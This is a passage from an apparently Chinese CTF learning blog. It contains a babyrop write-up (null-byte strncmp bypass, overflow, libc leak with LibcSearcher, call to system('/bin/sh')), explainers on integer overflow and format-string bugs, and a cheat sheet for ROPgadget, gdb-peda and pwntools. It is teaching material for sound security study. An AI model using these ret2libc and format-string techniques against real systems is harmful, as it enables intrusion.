<p>发现开启了RELOR（不能修改GOT表）和NX（堆栈不可执行）保护，并且文件是x86平台下的可执行文件，接着我们执行一下看看</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/2.png"></p>
<p>然后就是啥都没有~那么直接拖进IDA瞅瞅是啥妖魔鬼怪。在进入反汇编后，main函数里的情况如下</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/3.png"></p>
<p>能发现，在第八行的伪代码中开启了一个随机数设备，然后，把随机数输入到buf缓冲区中，并且还要将缓冲区的这个随机数放入一个函数里，接下来看看这个函数是什么</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/4.png"></p>
<p>感觉莫名其妙的把原先的随机数输入到s中，然后读取0x20数据进入到buf，再将两个进行比较。一系列的操作确实让人摸不着头脑，毕竟flag，shell啥的都没有影子，想溢出会发现溢出点不够，这里就不再展示了。那么只好再看看最后一个函数藏了些什么</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/5.png"></p>
<p>然后这是buf的位置<img src="2020-12-14-0Geek2019babyrop.assets/6.png"></p>
<p>可以发现呢，第一个if下的是不够溢出，但是，else里的直接把a1作为输入的个数，而a1是char类型的，最大能取到0xff，很显然能溢出！那么，思路到此就很清晰了！首先，我们要让程序能执行到最后一个函数，并且要让这个函数的返回值为0xff，然后就是去找system函数和/bin/sh的参数进行获取shell，最终得到flag。</p>
<p>那么回过头看看前面的函数<img src="2020-12-14-0Geek2019babyrop.assets/4-1607933710690.png"></p>
<p>要让程序继续，就是要绕过strncmp这个函数，因为是随机数，所以意味着是无法知道到底是什么，而进行输入到buf中，使其两者相等，那么此时看看strlen这个函数，这个函数有个特点，就是遇到’\0’就会停止读取。如果利用这点，在buf的第一个字节处就填写上’\0’，就可以让比较的字符个数为0，直接跳过比较，从而到我们要的可以溢出函数</p>
<p>现在仔细的看看最后的函数的条件，它是把前一个函数的返回值当做参数进行输入，在栈中可以看见这个返回值就在我们可以输入的buf的下边</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/7.png"></p>
<p>这里注意一点，0x2c处的buf是有7个字节大小的。其他就是把0x25的覆盖为0xff。这里做完后，就是再算一下最后一个函数里的溢出距离为0xe7+0x4。那么此刻最大问题就是system函数，可以发现，无论是左边的函数表还是关键字符串中都无法找到system和/bin/sh的调用，所以这里要用到LibcSearcher去寻找libc库，然后计算偏移地址，因为在调用中，两个函数间的相对距离是不变的，并且偏移距离是一致的。那么，就是调用两次函数，一次进行泄露某个函数（我用的是write。read函数也行，我试了，发现会需要让你去选择libc库的版本，write不需要，具体原因不知道~）的got表地址去计算偏移地址，第二次就是调用system获取flag，上exp！</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/8.png"></p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/9.png"></p>
<p>解决！</p>
<p>题外话一句，脚本文件不能取pwn名字噢！因为pwn已经是个模块了，取了会报错的</p>
]]></content>
  </entry>
  <entry>
    <title>整数溢出</title>
    <url>/2020/12/10/2020-12-10-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>数据类型以及所取的范围（来自ctf-wiki，之后的内容也是参照了许多的wiki，以及一些来自别处的零碎,环境为64位下使用gcc-5.4）</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">字节</th>
<th align="center">范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~32767(0~0x7fff) <br> -32768~-1(0x8000~0xffff)</td>
</tr>
<tr>
<td align="center">unsigned short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~65535(0~0xffff)</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~2147483647(0~0x7fffffff) <br> -2147483648~-1(0x80000000~0xffffffff)</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~4294967295(0~0xffffffff)</td>
</tr>
<tr>
<td align="center">long int</td>
<td align="center">8byte(qword)</td>
<td align="center">正: 0~0x7fffffffffffffff<br>负:0x8000000000000000~0xffffffffffffffff</td>
</tr>
<tr>
<td align="center">unsigned long int</td>
<td align="center">8byte(qword)</td>
<td align="center">0~0xffffffffffffffff</td>
</tr>
</tbody></table>
<p>那么，所谓的整数溢出，就是指程序中变量所取数据超过了其数据类型的范围而造成的溢出现象。</p>
<p>整数溢出一共分为三种类型：</p>
<ul>
<li>有符号数溢出</li>
<li>无符号数溢出</li>
<li>高位数传低位数的截断</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 伪代码<br>short int a;<br><br>a = a + 1;<br># 对应的汇编<br>movzx  eax, word ptr [rbp - 0x1c]<br>add    eax, 1<br>mov    word ptr [rbp - 0x1c], ax<br><br>unsigned short int b;<br><br>b = b + 1;<br># assembly code<br>add    word ptr [rbp - 0x1a], 1<br></code></pre></td></tr></table></figure>

<p>以上为无符号数和有符号数进行+1操作的汇编指令，可以看出，有符号数的运算是在寄存器中进行运算的，而无符号数是直接在内存中进行运算的</p>
<h1 id="有符号数溢出"><a href="#有符号数溢出" class="headerlink" title="有符号数溢出"></a>有符号数溢出</h1><p>以下均假设 short int a;</p>
<h3 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h3><p>short的范围在0~0x7fff和负数0x8000~0xffff</p>
<p>假设取最大值0x7fff(32767)把它进行加1的运算，变为0x8000，就会发现：0x8000在有符号数中是-32768，实现了从一个正数变为了负数，用十进制来表示就是<strong>32767+1==-32768</strong> </p>
<h3 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h3><p>假设取最小值0x8000进行减1运算，得到结果为0x7fff，这在有符号数中是正数32767。</p>
<p>即：**-32768-1==32767**</p>
<h2 id="无符号数溢出"><a href="#无符号数溢出" class="headerlink" title="无符号数溢出"></a>无符号数溢出</h2><p>以下均假设 unsigned short int </p>
<h3 id="上界溢出-1"><a href="#上界溢出-1" class="headerlink" title="上界溢出"></a>上界溢出</h3><p>unsigned short的范围是在0~0xffff</p>
<p>假设取最大值0xffff进行加1运算，虽然结果本应该是0x10000，但是由于只能存储两个字节的原因，会进行截断，只能取到0x0000。这个过程用十进制来表示就是<strong>65535+1==0</strong></p>
<h3 id="下界溢出-1"><a href="#下界溢出-1" class="headerlink" title="下界溢出"></a>下界溢出</h3><p>假设取最小值0x0000进行减1运算，因为无符号数不存在负数，那么得到的结果0xffff不会进行负数的补码还原得到-1，而是按照整数得到65535，即<strong>0-1==65535</strong></p>
<p>以上，两种的上下界溢出的道理是一致的，都是因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在而在编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令。正前后的不一致，造成了漏洞的出现</p>
<h2 id="高位数传低位数的截断"><a href="#高位数传低位数的截断" class="headerlink" title="高位数传低位数的截断"></a>高位数传低位数的截断</h2><p>这种其实最好理解，就是因为数据类型的位数不够，而不能取得完全值，只能取到与自身位数相等的数值，而造成数据的截断</p>
<ul>
<li>加法截断： </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0xffffffff + 0x00000001 <br><br>= 0x0000000100000000 (long int) <br><br>= 0x00000000 (int) <br></code></pre></td></tr></table></figure>

<ul>
<li>乘法截断</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x00123456 * 0x00654321 <br>= 0x000007336BF94116 (long int) <br>= 0x6BF94116 (int)<br></code></pre></td></tr></table></figure>

<p>整数溢出就大致到此了，但是如何利用它造成危害呢？一般都是利用整数溢出和其他的漏洞进行搭配而造成危害。</p>
<p>以下有两个函数，常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
<ul>
<li>memcpy()函数原型为void *memcpy(void *dest, const void *src, size_t n); 功能是将 src 所指向的字符串的前 n 个字符复制到 dest 所指的数组中，并返回 dest。</li>
<li>strncpy()函数原型为char *strncpy(char *dest, const char *src, size_t n)；功能是从源 src 所指的内存地址的起始位置开始复制 n 个字节到目标 dest 所指的内存地址的起始位置中。并不会自动添加’\0’字符。 </li>
</ul>
<p>这两个函数的n都是无符号数，如果用一个负数去填充，就可能变成一个很大的数。从而复制大量内容到缓冲区中，造成溢出</p>
<p>其他的就靠做题与实战去提升巩固了</p>
]]></content>
  </entry>
  <entry>
    <title>LibcSearcher</title>
    <url>/2020/12/05/2020-12-05-LibcSearcher/</url>
    <content><![CDATA[<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>1、安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">git clone https://github.com/lieanu/LibcSearcher.git<br>cd LibcSearcher<br>python setup.py develop<br></code></pre></td></tr></table></figure>

<p>2、错误：</p>
<p><img src="2020-12-05-LibcSearcher.assets/2020101521162965.png"></p>
<p>处理办法：</p>
<p><img src="2020-12-05-LibcSearcher.assets/20201015211718534.png"></p>
<p>3、常见用法（脚本中使用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from LibcSearcher import *<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr（指的是got表地址）)<br>libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)<br>system_addr=libc_base+libc.dump(&#x27;system&#x27;)<br>binsh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br></code></pre></td></tr></table></figure>

<p>以上内容转载<a href="https://blog.csdn.net/yongbaoii/article/details/109105721">LibcSearcher 安装 错误处理 与使用</a></p>
]]></content>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="前提知识储备："><a href="#前提知识储备：" class="headerlink" title="前提知识储备："></a>前提知识储备：</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>格式化字符串函数可以接受<strong>可变数量</strong>的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>后续参数，就是下图中逗号后的变量（可以不要）</li>
</ul>
<p>上述可转为该图：</p>
<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/printf.png"></p>
<p>将相关正式概念代入图片更好理解</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>输入：</p>
<ul>
<li>scanf</li>
</ul>
<p>输出函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="center">printf</td>
<td align="center">输出到stdout</td>
</tr>
<tr>
<td align="center">fprintf</td>
<td align="center">输出到指定FILE流</td>
</tr>
<tr>
<td align="center">vprintf</td>
<td align="center">根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td align="center">vfprintf</td>
<td align="center">根据参数列表格式化输出到指定FILE流</td>
</tr>
<tr>
<td align="center">sprintf</td>
<td align="center">输出到字符串</td>
</tr>
<tr>
<td align="center">snprintf</td>
<td align="center">输出指定字节数到字符串</td>
</tr>
<tr>
<td align="center">vsprintf</td>
<td align="center">根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td align="center">vsnprintf</td>
<td align="center">根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td align="center">setproctitle</td>
<td align="center">设置argv</td>
</tr>
<tr>
<td align="center">syslog</td>
<td align="center">输出日志</td>
</tr>
<tr>
<td align="center">err, verr, warn, vwarn等</td>
<td align="center">。。。</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>printf函数的字符串漏洞</p>
<p>此漏洞如（来自攻防世界的CGfsb）：</p>
<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
</li>
</ul>
<p>在格式化字符串函数中%n，作用是把在%n前输出的字符个数赋值给对应的整型指针参数所指的变量</p>
<p>%hh的作用是限定输出格式为8位，即一个字节；</p>
<p>%h的作用是限定输出格式为16位，即两个字节；</p>
<p>%l的作用是限定输出格式为32位，即四个字节；</p>
<p>%ll的作用是限定输出格式为64位，即八个字节；</p>
<p>%L的作用是输出实数，支持long double类型；</p>
<ul>
<li><p>sprintf原型int sprintf(char *string, char *format [,argument,…])</p>
<ul>
<li><p><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</p>
</li>
<li><p><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags] (width)[.precision] (length)specifier**</p>
</li>
<li><p>**[argument]…**：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p>
</li>
</ul>
</li>
</ul>
<p>把格式化的数据写入某个字符串缓冲区。如果成功，则返回写入的字符总数（不包括’\0’），不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="x86系统下："><a href="#x86系统下：" class="headerlink" title="x86系统下："></a>x86系统下：</h3><p>以printf为例</p>
<p><img src="2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.assets/printf-1608199588168.png"></p>
<p>假设printf函数将以图中方式进行输出。那么作为一个函数，首先就是将参数入栈，又按照从右到左的方式。那么将按以下的情况入栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s，Number %d，Float %4.2f<br></code></pre></td></tr></table></figure>

<p>执行printf函数后，函数会获取第一个参数，也就是格式化字符串。函数将会一个个的读取字符串中的字符，有以下情况：</p>
<ul>
<li>当前字符不是%，直接输出到相应标准输出。</li>
<li>当前字符是%， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是%,输出%；否则根据相应字符对应的数据类型，获取相应的参数，将其输出</li>
</ul>
</li>
</ul>
<p>那么漏洞将会发生在哪呢？</p>
<p>假设我们将程序写成这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>我们并没有提供printf函数中%后对应的参数，此时程序并不会报错停止，而是继续执行，会在栈中存储着格式化字符串地址上面的三个高地址变量解析，作为输出：</p>
<ul>
<li><p>%s则解析其地址对应的字符串</p>
</li>
<li><p>%d解析内容对应的整型值</p>
</li>
<li><p>%f解析内容对应的浮点值</p>
<p>第一个，注意！解析地址！如果是一个无法访问的地址比如0，那么程序将崩溃，这也是我们利用的点，比如注入不限量个%s，总有一个能让程序崩溃的。而其余两个我们也可以借此而使得栈上的内容泄露出来</p>
<p>这里补充一点：我们是可以获取栈中被视为第n+1个参数的值方法为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$x<br></code></pre></td></tr></table></figure>

<p>n代表该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
<h3 id="x64系统下："><a href="#x64系统下：" class="headerlink" title="x64系统下："></a>x64系统下：</h3><p>原理与x86并无不同，唯一需要注意的就是x64系统下，函数的前六位参数是使用寄存器存放的，顺序为RDI,RSI,RDX,RCX,R8,R9对应前六位参数，所以在gdb中相对偏移时，要把栈上的偏移加上相差寄存器的数量的才是n的值</p>
</li>
</ul>
<p>参考：</p>
<p>ctf-wiki格式化字符串漏洞</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具的安装及使用指令</title>
    <url>/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>一般用在64位下，因为64位的函数传参与32位有些不同，需使用到寄存器传参，常用命令格式：</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>  或者 <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>| <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;eax&#x27;</span> <br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;leave|ret&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;sh&#x27;</span>（有的时候是找<span class="hljs-string">sh</span>，这个也可以成为参数）<br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;int&#x27;</span>  （寻找<span class="hljs-string">int</span> <span class="hljs-string">80H</span>系统中断指令）<br></code></pre></td></tr></table></figure>

<p>附：</p>
<p>搭配使用one_gadget</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">sudo apt -y install ruby<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p>one_gadget是用来去查找动态链接库里execve(“/bin/sh”, rsp+0x70, environ)函数的地址的</p>
<p>使用方法：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101517362410.png"></p>
<p>来源： <a href="https://blog.csdn.net/yongbaoii/article/details/109101822">https://blog.csdn.net/yongbaoii/article/details/109101822</a> </p>
<h2 id="gdb-peda（必须掌握）"><a href="#gdb-peda（必须掌握）" class="headerlink" title="gdb -peda（必须掌握）"></a>gdb -peda（必须掌握）</h2><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序</p>
<p>可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）</p>
<p>当程序被停住时，可以检查此时你的程序中所发生的事。</p>
<p>动态的改变你程序的执行环境</p>
<p>使用前要：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">gcc -<span class="hljs-keyword">g</span> <span class="hljs-keyword">test</span>.c -o <span class="hljs-keyword">test</span><br><span class="hljs-comment">//gcc中-g选项是为了获得有关调试信息，要用gdb进行调试，必须使用-g生成二进制可执行文件</span><br></code></pre></td></tr></table></figure>

<h4 id="常用指令："><a href="#常用指令：" class="headerlink" title="常用指令："></a>常用指令：</h4><ul>
<li><p>checksec 查看elf编译的保护选项</p>
</li>
<li><p>aslr 查看gdb的aslr设置 aslr on 可开启alsr设置</p>
</li>
<li><p>file 文件名 加载objfile </p>
</li>
<li><p>disas addr 对地址addr处的指令进行反汇编，addr可以是函数名（但是不加* 使用函数名就无法用于参数确认；不加*，断点就不会设置到汇编语言层级的函数开头）</p>
</li>
<li><p>b *addr 在addr处下一个断点   b后跟函数名就不用 *</p>
</li>
<li><p>enable 激活断点</p>
</li>
<li><p>disable 禁用断点</p>
</li>
<li><p>info b 查看断点</p>
</li>
<li><p>del num 删除断点</p>
</li>
<li><p>x addr 查看addr处存储的数据值 </p>
</li>
<li><p>x/wx $esp 　　以4字节16进制显示栈中内容</p>
</li>
<li><p>stack 100　　 插件提供，显示栈中100项</p>
</li>
<li><p>find xxx　　 快速查找，很实用</p>
</li>
<li><p>r 运行被调试的程序 </p>
</li>
<li><p>c 继续运行 </p>
</li>
<li><p>ni 单步执行不进入函数调用</p>
</li>
<li><p>si 单步执行并进入函数调用</p>
</li>
<li><p>elfsymbol – 获取non-debugging symbol信息（plt表）</p>
</li>
<li><p>parseheap 可以对heap进行分析，得到相关信息</p>
</li>
<li><p>dumprop –在给定内存范围中Dump出所有ROP gadgets </p>
</li>
<li><p>vmmap 得到虚拟映射地址，同时可查看执行权限</p>
</li>
<li><p>heapinfo 查看bin链信息</p>
</li>
<li><p>heapbase 查看堆地址</p>
</li>
<li><p>finish 执行到函数返回</p>
</li>
<li><p>arena 查看mainarena</p>
</li>
<li><p>telescope 地址    可以查看一小段该地址的内容</p>
</li>
<li><p>dumpargs– 函数将要被调用时，显示将要被传入函数的所有参数</p>
</li>
<li><p>readelf – 获取elf头信息 </p>
</li>
<li><p>x/&lt;n/f/u&gt;其中n、f、u是可选的参数</p>
<p>x/s 地址　　查看字符串</p>
<p>x/wx 地址　　查看DWORD</p>
<p>x/c 地址　　单字节查看</p>
<p>x/16x $esp+0x12 查看寄存器偏移（16代表查看16个）</p>
<p>set args 可指定运行时参数。（如：set args 10 20 30 40 50）</p>
<p>show args 命令可以查看设置好的运行参数。</p>
</li>
</ul>
<p>s 按字符串输出</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><ul>
<li><p>s step，si步入</p>
</li>
<li><p>n 执行下一条指令 一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编，ni步入，这个就是真正的下一条汇编指令</p>
</li>
<li><p>b 在某处下断点，可以用</p>
</li>
<li><ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b 查看断点信息</li>
<li>delete 1 删除第一个断点</li>
</ul>
</li>
<li><p>c 继续</p>
</li>
<li><p>r 执行</p>
</li>
<li><p><strong>disas addr 查看addr处前后的反汇编代码</strong></p>
</li>
<li><p>readelf 文件信息</p>
</li>
</ul>
<p>一般c,n,ni后面都可以跟数字，</p>
<p>ni 10</p>
<p>就代表下10行指令</p>
<h1 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h1><h2 id="p"><a href="#p" class="headerlink" title="p"></a>p</h2><ul>
<li>p function 显示某个函数地址</li>
<li>p $esp 某个寄存器的值</li>
<li><strong>p 0xdd-0x55 可以当计算器（常用，不用另外开python了）</strong></li>
<li><strong>p &amp;VarName 查看变量地址（貌似蛮有用的）</strong></li>
<li>p * 0xffffebac 查看某个地址处的值</li>
</ul>
<h2 id="x"><a href="#x" class="headerlink" title="x"></a>x</h2><ul>
<li>x/10wx addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/40gx addr 跟上面一样，一般上面32位用，这个64位</li>
<li>x/10s addr 查看addr开始的10个字符串</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/b addr 查看addr处的字符</li>
<li><strong>x/10i addr 查看addr处的反汇编结果（addr可以为函数）（常用）</strong></li>
</ul>
<h2 id="info-i"><a href="#info-i" class="headerlink" title="info(i)"></a>info(i)</h2><ul>
<li><strong>info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)</strong></li>
<li>i r eflags 查看状态寄存器</li>
<li>i r ss 查看段寄存器</li>
<li>i b 查看断点信息</li>
<li>i functions 查看所有的函数</li>
</ul>
<h1 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h1><ul>
<li><strong>find 查找字符串 peda带有（常用）</strong></li>
<li>searchmem 查找字符串 peda带有</li>
<li>ropsearch “xor eax,eax;ret” 0x08048080 0x08050000 查找某段的rop peda带有</li>
<li>ropgadget 提供多个pop|ret可行结果 peda带有</li>
</ul>
<h1 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h1><ul>
<li><strong>dumpargs 查看调用函数的参数</strong></li>
<li>dumprop addr1 addr2 显示addr1-addr之间的ropgadgets</li>
<li>plt pwntools中的ELF(elf).symbols(function_name)</li>
<li>got pwntools中的ELF(elf).got(function_name)</li>
<li>elfsymbol 非调试符号信息</li>
</ul>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="context设置"><a href="#context设置" class="headerlink" title="context设置"></a>context设置</h3><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
<p>一般来说我们设置context只需要简单的一句话:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>这句话的意思是： </p>
<ol>
<li>os（operating system 操作系统）设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li>
<li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li>
<li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li>
</ol>
<h3 id="Cyclic-Pattern"><a href="#Cyclic-Pattern" class="headerlink" title="Cyclic Pattern"></a>Cyclic Pattern</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。</p>
<p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。 </p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">用法：<br>cyclic(<span class="hljs-number">0</span>x100) <span class="hljs-meta"># 生成一个0x100大小的pattern，即一个特殊的字符串</span><br>cyclic_find(<span class="hljs-number">0</span>x61616161) <span class="hljs-meta"># 找到该数据在pattern中的位置</span><br>cyclic_find(&#x27;aaaa&#x27;) <span class="hljs-meta"># 查找位置也可以使用字符串去定位</span><br></code></pre></td></tr></table></figure>

<p>比如，我们在栈溢出的时候，首先构造<code>cyclic(0x100)</code>，或者更长长度的pattern，进行输入，输入后pc的值变为了0x61616161，那么我们通过<code>cyclic_find(0x61616161)</code>就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。</p>
<p>可以直接在shell中使用cyclic 100</p>
<p>然后查找溢出点 使用 cyclic -l 0x61616161</p>
<p>来源：<a href="https://blog.csdn.net/qq_29343201/article/details/51337025">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./xxx<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc database"></a>libc database</h2><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
<p>先下载libc database</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/niklasb/libc-database<br></code></pre></td></tr></table></figure>

<p>利用get来下载流行的libc库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd libc-database<br>./get ubuntu<br></code></pre></td></tr></table></figure>

<p>程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下</p>
<p>用法：使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./find <span class="hljs-built_in">printf</span> 260 puts f30</span><br></code></pre></td></tr></table></figure>

<h2 id="pwn-debug"><a href="#pwn-debug" class="headerlink" title="pwn_debug"></a>pwn_debug</h2>]]></content>
  </entry>
  <entry>
